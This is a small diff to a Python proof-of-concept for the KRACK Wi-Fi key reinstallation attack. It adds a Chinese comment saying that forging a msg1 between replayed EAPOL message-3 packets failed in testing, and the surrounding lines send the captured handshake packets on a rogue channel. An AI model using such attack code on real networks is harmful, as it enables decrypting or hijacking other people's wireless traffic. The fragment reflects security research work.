@@ -304,6 +304,7 @@ class KRAckAttack():
 				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
 				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
 				packet_list = client.msg3s
+				# 插入一個 msg 假裝是正常的流程 (但是實測沒有作用，會導致失敗)
 				# p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				# packet_list.insert(1, p)
 				for p in packet_list: self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
